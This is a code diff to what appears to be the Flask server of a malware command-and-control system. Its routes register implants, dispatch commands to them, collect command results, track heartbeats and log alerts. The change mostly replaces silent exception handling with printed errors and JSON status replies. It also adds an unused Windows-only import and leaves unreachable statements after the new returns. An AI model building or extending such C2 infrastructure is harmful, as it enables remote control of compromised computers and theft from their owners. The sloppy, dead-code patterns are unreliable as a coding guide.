@@ -1,6 +1,7 @@
 import functools
 
 from datetime import datetime
+from msilib.schema import Error
 
 
 from flask import (
@@ -66,13 +67,22 @@ def register():
                         db.session.commit()
                         print("Implant added")
                         return jsonify({"status":"good job"})
-                except:
-                    pass
+                except Exception as e:
+                    print(e)
+
+                    return jsonify({"status":"bad job"})
+
             else:
+                return jsonify({"status":"bad job"})
+
                 print("Alert: somone is trying to play with us")
 
             flash(error)
-    except:
+    except Exception as e:
+        print(e)
+
+        return jsonify({"status":"bad job"})
+
         print("error")
         pass
 
@@ -98,8 +108,11 @@ def get_next_command():
                     return jsonify({"command_id": cmd_id, "command": command})
                 else:
                     return jsonify({"command_id": -1, "command": "No command"})
-        except:
-            pass
+        except Exception as e:
+            print(e)
+
+            return jsonify({"command_id": -1, "command": "No command"})
+
 
 
 @bp.route('/sendCommandResult', methods=['POST'])
@@ -120,7 +133,10 @@ def store_command_results():
                     return jsonify({"status": "Result posted"})
                 else:
                     return jsonify({"status": "Error in posting result"})
-        except:
+        except Exception as e:
+            print(e)
+
+            return jsonify({"status": "Error in posting result"})
             pass
 
 
@@ -135,9 +151,14 @@ def heartbeat():
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                 implant.last_seen = current_date_time
                 return jsonify({"status": "keep Alive"})
-            except:
+            except Exception as e:
+                print(e)
+
                 return jsonify({"status": "register first"})
-        except:
+        except Exception as e:
+            print(e)
+
+            return jsonify({"status": "register first"})
             pass
 
 
@@ -153,7 +174,11 @@ def alert():
                 alert = Alert(computer_guid=imp_id,
                               time_reported=current_date_time, alert=alert)
                 return jsonify({"status": "Alert Registered"})
-            except:
+            except Exception as e:
+                print(e)
+
                 return jsonify({"status": "Bad alert"})
-        except:
+        except Exception as e:
+            print(e)
+            return jsonify({"status": "Bad alert"})
             pass
